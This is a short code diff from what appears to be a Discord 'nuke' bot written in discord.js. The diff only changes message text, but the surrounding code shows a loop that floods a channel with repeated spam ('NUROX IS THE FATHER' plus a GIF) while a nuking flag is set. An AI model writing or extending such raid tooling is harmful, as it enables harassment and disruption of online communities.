@@ -64,7 +64,7 @@ client.on('messageCreate', async (message) => {
     
     while (isNuking) {
       try {
-        await message.channel.send(`> :BS_Red_Arrow: **NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
+        await message.channel.send(`> **NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
       } catch (err) {
         console.error('Error sending message:', err);
       }
@@ -87,7 +87,7 @@ client.on('interactionCreate', async (interaction) => {
   if (!interaction.isChatInputCommand()) return;
 
   if (interaction.user.id !== OWNER_ID) {
-    return interaction.reply({ content: '❌ You are not allowed to use this command!', ephemeral: true });
+    return interaction.reply({ content: '❌ You are not NUROX to use this command!', ephemeral: true });
   }
 
   const { commandName } = interaction;
